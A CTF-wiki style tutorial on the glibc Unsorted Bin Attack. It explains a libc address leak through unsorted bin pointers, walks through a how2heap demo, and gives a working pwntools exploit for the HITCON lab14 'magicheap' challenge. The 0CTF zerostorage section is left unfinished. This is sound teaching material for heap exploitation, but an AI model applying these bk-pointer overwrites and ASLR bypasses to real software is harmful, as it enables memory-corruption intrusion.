# Unsorted Bin Attack

## Overview

Unsorted Bin Attack, as the name suggests, is an attack closely related to the Unsorted Bin mechanism in Glibc heap management.

The prerequisite for exploiting an Unsorted Bin Attack is the ability to control the `bk` pointer of an Unsorted Bin Chunk.

The effect that an Unsorted Bin Attack can achieve is modifying the value at an arbitrary address to a large number.

## Unsorted Bin Review

Before introducing the Unsorted Bin Attack, let's first review the basic sources and basic usage of the Unsorted Bin.

### Basic Sources

1. When a larger chunk is split into two halves, if the remaining part is larger than MINSIZE, it will be placed into the unsorted bin.
2. When freeing a chunk that does not belong to a fast bin and the chunk is not adjacent to the top chunk, the chunk will first be placed into the unsorted bin. For an explanation of the top chunk, please refer to the introduction below.
3. During malloc_consolidate, the merged chunk may be placed into the unsorted bin, if it is not adjacent to the top chunk.

### Basic Usage

1. The Unsorted Bin uses FIFO traversal order during operation, **meaning insertion happens at the head of the unsorted bin, and removal happens from the tail of the linked list**.
2. When the program calls malloc, if no chunk of the corresponding size can be found in the fastbin or small bin, it will try to find a chunk from the Unsorted Bin. If the retrieved chunk is exactly the right size, it will be returned directly to the user; otherwise, these chunks will be inserted into their corresponding bins respectively.

## Unsorted Bin Leak

Before introducing the Unsorted Bin Attack, let's first introduce how to use the Unsorted Bin for leaking. This is actually a small trick that is used in many challenges.

### Unsorted Bin Structure

The `Unsorted Bin` is managed as a circular doubly linked list. If the `Unsorted Bin` contains two `bin`s, the linked list structure is as follows:

![](./figure/unsortedbins-struct.jpg)

The image below is a reproduction of the above structure:

![](./figure/gdb-debug-state.png)

We can see that in this linked list, there must be a node (inaccurately speaking, the tail node — just get the general idea, since a circular linked list doesn't really have a head or tail) whose `fd` pointer points to the inside of the `main_arena` structure.

### Leak Principle

If we can leak the correct `fd` pointer, we can obtain an address that has a fixed offset from `main_arena`, and this offset can be determined through debugging. `main_arena` is a global variable of type `struct malloc_state` and is the only instance that `ptmalloc` uses to manage the main arena. Speaking of global variables, we can immediately think that it would be allocated in segments like `.data` or `.bss`. So if we have the `.so` file of the `libc` used by the process, we can obtain the offset between `main_arena` and the `libc` base address, thereby bypassing `ASLR`.

So how do we obtain the offset between `main_arena` and the `libc` base address? Here are two approaches.

#### Deriving it through the __malloc_trim function

In `malloc.c`, there is the following code:

```cpp
int
__malloc_trim (size_t s)
{
  int result = 0;

  if (__malloc_initialized < 0)
    ptmalloc_init ();

  mstate ar_ptr = &main_arena;//<=here!
  do
    {
      __libc_lock_lock (ar_ptr->mutex);
      result |= mtrim (ar_ptr, s);
      __libc_lock_unlock (ar_ptr->mutex);

      ar_ptr = ar_ptr->next;
    }
  while (ar_ptr != &main_arena);

  return result;
}
```

Notice `mstate ar_ptr = &main_arena;` — this accesses `main_arena`, so we can use tools like IDA to analyze and determine the offset.

![](./figure/malloc-trim-ida.png)

For example, by loading the `.so` file into IDA and finding the `malloc_trim` function, we can obtain the offset.

#### Calculating it directly through __malloc_hook

Coincidentally, the address difference between `main_arena` and `__malloc_hook` is 0x10, and most libc versions allow us to directly look up the address of `__malloc_hook`, which greatly reduces the workload. Using pwntools as an example:

```python
main_arena_offset = ELF("libc.so.6").symbols["__malloc_hook"] + 0x10
```

This way we can obtain the offset between `main_arena` and the base address.

### Methods to Achieve the Leak

Generally speaking, to achieve a leak, you need a `UAF`. After placing a `chunk` into the `Unsorted Bin`, you can then leak its `fd`. Typical note management challenges have a `show` function, and calling `show` on the node at the tail of the linked list can give you the `libc` base address.

In particular, in `CTF` exploitation scenarios, the heap is usually freshly initialized, so the `Unsorted Bin` is generally clean. When there is only one `bin` in it, that `bin`'s `fd` and `bk` will both point to within `main_arena`.

Additionally, if we cannot access the tail of the linked list but can access the head, then in a 32-bit environment, calling `printf` or similar functions on the head of the linked list can often output both `fd` and `bk` together, which also allows for an effective leak. However, in a 64-bit environment, since higher addresses often contain `\x00`, many output functions will be truncated, making it difficult to achieve an effective leak.

## Unsorted Bin Attack Principle

In [glibc](https://code.woboq.org/userspace/glibc/)/[malloc](https://code.woboq.org/userspace/glibc/malloc/)/[malloc.c](https://code.woboq.org/userspace/glibc/malloc/malloc.c.html), within `_int_malloc`, there is a section of code where, when removing a chunk from the unsorted bin, the location of `bck->fd` is written with the position of this Unsorted Bin.

```C
          /* remove from unsorted list */
          if (__glibc_unlikely (bck->fd != victim))
            malloc_printerr ("malloc(): corrupted unsorted chunks 3");
          unsorted_chunks (av)->bk = bck;
          bck->fd = unsorted_chunks (av);
```

In other words, if we control the value of bk, we can write `unsorted_chunks (av)` to an arbitrary address.



Here I will use [unsorted_bin_attack.c](https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c) from shellphish's how2heap repository as an example, with some simple modifications as follows:

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
  fprintf(stderr, "This file demonstrates unsorted bin attack by write a large "
                  "unsigned long value into stack\n");
  fprintf(
      stderr,
      "In practice, unsorted bin attack is generally prepared for further "
      "attacks, such as rewriting the "
      "global variable global_max_fast in libc for further fastbin attack\n\n");

  unsigned long target_var = 0;
  fprintf(stderr,
          "Let's first look at the target we want to rewrite on stack:\n");
  fprintf(stderr, "%p: %ld\n\n", &target_var, target_var);

  unsigned long *p = malloc(400);
  fprintf(stderr, "Now, we allocate first normal chunk on the heap at: %p\n",
          p);
  fprintf(stderr, "And allocate another normal chunk in order to avoid "
                  "consolidating the top chunk with"
                  "the first one during the free()\n\n");
  malloc(500);

  free(p);
  fprintf(stderr, "We free the first chunk now and it will be inserted in the "
                  "unsorted bin with its bk pointer "
                  "point to %p\n",
          (void *)p[1]);

  /*------------VULNERABILITY-----------*/

  p[1] = (unsigned long)(&target_var - 2);
  fprintf(stderr, "Now emulating a vulnerability that can overwrite the "
                  "victim->bk pointer\n");
  fprintf(stderr, "And we write it with the target address-16 (in 32-bits "
                  "machine, it should be target address-8):%p\n\n",
          (void *)p[1]);

  //------------------------------------

  malloc(400);
  fprintf(stderr, "Let's malloc again to get the chunk we just free. During "
                  "this time, target should has already been "
                  "rewrite:\n");
  fprintf(stderr, "%p: %p\n", &target_var, (void *)target_var);
}
```

The effect after running the program is:

```shell
➜  unsorted_bin_attack git:(master) ✗ gcc unsorted_bin_attack.c -o unsorted_bin_attack
➜  unsorted_bin_attack git:(master) ✗ ./unsorted_bin_attack
This file demonstrates unsorted bin attack by write a large unsigned long value into stack
In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack

Let's first look at the target we want to rewrite on stack:
0x7ffe0d232518: 0

Now, we allocate first normal chunk on the heap at: 0x1fce010
And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()

We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78
Now emulating a vulnerability that can overwrite the victim->bk pointer
And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe0d232508

Let's malloc again to get the chunk we just free. During this time, target should has already been rewrite:
0x7ffe0d232518: 0x7f1c705ffb78
```

Here we can use a diagram to describe the specific flow and the underlying principle.

![](./figure/unsorted_bin_attack_order.png)

**Initial State**

The fd and bk of the unsorted bin both point to the unsorted bin itself.

**Executing free(p)**

Since the size of the freed chunk does not fall within the fast bin range, it will first be placed into the unsorted bin.

**Modifying p[1]**

After modification, the bk pointer of p that was originally in the unsorted bin will point to a forged chunk at target addr-16, meaning the Target Value is located at the fd position of the forged chunk.

**Allocating a chunk of size 400**

At this point, the requested chunk falls within the small bin range, and the corresponding bin temporarily has no chunks, so it will look in the unsorted bin. It finds that the unsorted bin is not empty, so it takes out the last chunk from the unsorted bin.

```c
        while ((victim = unsorted_chunks(av)->bk) != unsorted_chunks(av)) {
            bck = victim->bk;
            if (__builtin_expect(chunksize_nomask(victim) <= 2 * SIZE_SZ, 0) ||
                __builtin_expect(chunksize_nomask(victim) > av->system_mem, 0))
                malloc_printerr(check_action, "malloc(): memory corruption",
                                chunk2mem(victim), av);
            size = chunksize(victim);

            /*
               If a small request, try to use last remainder if it is the
               only chunk in unsorted bin.  This helps promote locality for
               runs of consecutive small requests. This is the only
               exception to best-fit, and applies only when there is
               no exact fit for a small chunk.
             */
			/* Obviously, bck has been modified and does not meet the requirements here */
            if (in_smallbin_range(nb) && bck == unsorted_chunks(av) &&
                victim == av->last_remainder &&
                (unsigned long) (size) > (unsigned long) (nb + MINSIZE)) {
				....
            }

            /* remove from unsorted list */
            unsorted_chunks(av)->bk = bck;
            bck->fd                 = unsorted_chunks(av);
```

- victim = unsorted_chunks(av)->bk=p
- bck = victim->bk=p->bk = target addr-16
- unsorted_chunks(av)->bk = bck=target addr-16
- bck->fd                 = *(target addr -16+16) = unsorted_chunks(av);

**As we can see, during the process of removing the last chunk from the unsorted bin, victim's fd does not play a role, so even if we modify it to an illegal value, it doesn't matter.** However, it should be noted that the unsorted bin linked list may be corrupted as a result, and problems may occur when inserting chunks later.

That is, the value at target is modified to the head of the unsorted bin linked list, 0x7f1c705ffb78, which is the information output earlier.

```shell
We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78
Now emulating a vulnerability that can overwrite the victim->bk pointer
And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe0d232508

Let's malloc again to get the chunk we just free. During this time, target should has already been rewrite:
0x7ffe0d232518: 0x7f1c705ffb78
```

Here we can see that the unsorted bin attack can indeed modify the value at an arbitrary address, but the value it gets modified to is not under our control. The only thing we can know is that this value is relatively large. **Moreover, it should be noted that**

This may seem useless at first glance, but it actually does have some uses, such as:

- We can modify the number of loop iterations to allow the program to execute the loop more times.
- We can modify the `global_max_fast` in the heap so that larger chunks can be treated as fast bins, which then allows us to perform some fast bin attacks.

## HITCON Training lab14 magic heap

[Challenge link](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/unsorted_bin_attack/hitcontraining_lab14)

Here we modify the l33t function in the source program so that it can run properly.

```c
void l33t() { system("cat ./flag"); }
```

### Basic Information

```shell
➜  hitcontraining_lab14 git:(master) file magicheap
magicheap: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9f84548d48f7baa37b9217796c2ced6e6281bb6f, not stripped
➜  hitcontraining_lab14 git:(master) checksec magicheap
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/hitcontraining_lab14/magicheap'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

As we can see, the program is a dynamically linked 64-bit program with NX protection and Canary protection enabled.

### Basic Functionality

The program is essentially a custom heap manager with the following functions:

1. Create heap: Allocates a heap of the user-specified size and reads in content of the specified length, but does not set a NULL terminator.
2. Edit heap: Checks whether the heap at the specified index is non-null. If it is non-null, it modifies the heap content based on the size read from the user. This is where an arbitrary-length heap overflow vulnerability exists.
3. Delete heap: Checks whether the heap at the specified index is non-null. If it is non-null, it frees the corresponding heap and sets it to NULL.

At the same time, we can see that when we control v3 to be 4869 and also control magic to be greater than 4869, we can get the flag.

### Exploitation

Obviously, we can directly use the unsorted bin attack.

1. Free a heap chunk into the unsorted bin.
2. Use the heap overflow vulnerability to modify the bk pointer of the corresponding chunk in the unsorted bin to &magic-16.
3. Trigger the vulnerability.

The code is as follows:

```Python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

r = process('./magicheap')


def create_heap(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def edit_heap(idx, size, content):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def del_heap(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))


create_heap(0x20, "dada")  # 0
create_heap(0x80, "dada")  # 1
# in order not to merge into top chunk
create_heap(0x20, "dada")  # 2

del_heap(1)

magic = 0x6020c0
fd = 0
bk = magic - 0x10

edit_heap(0, 0x20 + 0x20, "a" * 0x20 + p64(0) + p64(0x91) + p64(fd) + p64(bk))
create_heap(0x80, "dada")  #trigger unsorted bin attack
r.recvuntil(":")
r.sendline("4869")
r.interactive()

```

## 2016 0CTF zerostorage - To Be Completed

**Note: To be further completed.**

Here we use [zerostorage](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/unsorted_bin_attack/zerostorage) from 2016 0CTF as an example.

**The challenge provided the server's system version and kernel version at the time, so you could download an identical one for debugging. Here we will just use our local machine for debugging. However, in the current Ubuntu 16.04, due to further randomization, the relative offset between the libc loading position and the program module loading position is no longer fixed, so BrieflyX's strategy can no longer be used. It seems that only angelboy's strategy can be used now.**

### Security Check

As we can see, this program has all protections enabled:

```shell
pwndbg> checksec
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/zerostorage/zerostorage'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

### Basic Functionality Analysis

The program manages storage space in the bss segment, with insert, delete, merge, delete, view, list, and exit functions. The structure of this storage is as follows:

```text
00000000 Storage         struc ; (sizeof=0x18, mappedto_7)
00000000                                         ; XREF: .bss:storage_list/r
00000000 use             dq ?
00000008 size            dq ?
00000010 xor_addr        dq ?
00000018 Storage         ends
```

#### insert-1

The basic functionality is as follows:

1. Iterates through the storage array to find the first unused element, but the array has a maximum size of 32.
2. Reads the length of the content to be stored in the storage element.
    - If the length is not greater than 0, exit directly;
    - Otherwise, if the requested bytes are less than 128, set it to 128;
    - Otherwise, if the requested bytes are not greater than 4096, set it to the corresponding value;
    - Otherwise, set it to 4096.
3. Uses calloc to allocate the specified length. Note that calloc initializes the chunk to 0.
4. XORs the memory address allocated by calloc with a value in the bss segment (initially a random number) to obtain a new memory address.
5. Reads in content based on the storage size read.
6. Saves the corresponding storage size and the address of the stored content to the corresponding storage element, and marks the element as in-use. **However, it should be noted that the storage size recorded here is the size input by the user!!!**
7. Increments the storage num count.

#### update-2

1. If nothing is stored, return directly.
2. Reads the id of the storage element to update. If the id is greater than 31 or the element is not currently in use, return directly.
3. Reads the length of content needed for the **updated** storage element.
    - If the length is not greater than 0, exit directly;
    - Otherwise, if the requested bytes are less than 128, set it to 128;
    - Otherwise, if the requested bytes are not greater than 4096, set it to the corresponding value;
    - Otherwise, set it to 4096.
4. Retrieves the original storage content address based on the random number in the bss segment.
5. If the updated length is not equal to the previous length, uses realloc to reallocate memory.
6. Reads data again and updates the storage element.

#### merge-3

1. If there is no more than 1 element in use, merging is not possible, so just exit directly.
2. Checks if the storage is full. If not, finds the free slot.
3. Reads the id of merge_from and the id of merge_to respectively, and performs corresponding size and usage state checks.
4. Calculates the space needed after merging the two based on the size originally input by the user. **If it is not greater than 128, no new space will be allocated**; otherwise, new space of the corresponding size will be allocated.
5. Copies the contents of merge_to and merge_from to the corresponding positions sequentially.
6. **Finally, the memory address storing merge_from's content is freed but is not set to NULL. At the same time, the memory address storing merge_to's content is not freed; the XORed address of the corresponding storage is only set to NULL.**

**However, it should be noted that during merge, there is no check whether the IDs of the two storages are the same.**

#### delete-4

1. If no elements are stored, return directly.
2. Reads the id of the storage element to delete. If the id is greater than 32, return directly.
3. If the corresponding storage element is not in use, also return.
4. Then the corresponding fields of the element are set to NULL, and the corresponding memory is freed.

#### view-5

1. If no elements are stored, return directly.
2. Reads the id of the storage element to view. If the id is greater than 32, return directly.
3. If the corresponding storage element is not in use, also return.
4. Outputs the content of the corresponding storage.

#### list-6

1. If no elements are stored, return directly.
2. Reads the id of the storage element to list. If the id is greater than 32, return directly.
3. Iterates through all in-use storages and outputs their corresponding indices and sizes.

### Vulnerability Identification

Through this simple analysis, we can basically determine that the vulnerabilities are mainly concentrated in the insert and merge operations, especially when we merge two smaller-sized storages.

Let's analyze it in detail. If we insert a storage A with a small size (e.g., 8) during the insert process, then when we perform a merge, suppose we choose both storages to be A. In this case, the program will directly append A's content after A's original content, and then free the memory of A's data storage part. But this doesn't really matter, because A's content address has been assigned to another storage. When we access the content of the merged storage B, since B's data storage address is actually A's data storage address, what gets printed is A's data content. However, we just freed A's corresponding memory, and since A is not in the fast bin range, it will only be placed in the unsorted bin (and it's the only one at this point), so A's fd and bk will both store a base address of the unsorted bin.

If we had deleted a storage C before the merge, then after we merge A, A will be inserted at the head of the unsorted bin's doubly linked list, so its fd will be C's corresponding address and its bk will be a base address of the unsorted bin. This way we can directly leak two addresses.

Moreover, it should be noted that we can still modify the content of the merged B, so this is essentially a Use After Free.

### Exploitation Flow

- Unsorted Bin Attack

  Using the unsorted bin attack, we modify the global_max_fast global variable. Since the global_max_fast variable controls the maximum Fast chunk size, overwriting it with the address of the unsorted bin (which is generally a very large positive number) will cause subsequent chunks to all be treated as fast chunks, enabling Fast bin attacks.

- Fast Bin Attack

  

## Challenges

## References

- http://brieflyx.me/2016/ctf-writeups/0ctf-2016-zerostorage/
- https://github.com/HQ1995/Heap_Senior_Driver/tree/master/0ctf2016/zerostorage
- https://github.com/scwuaptx/CTF/blob/master/2016-writeup/0ctf/zerostorage.py
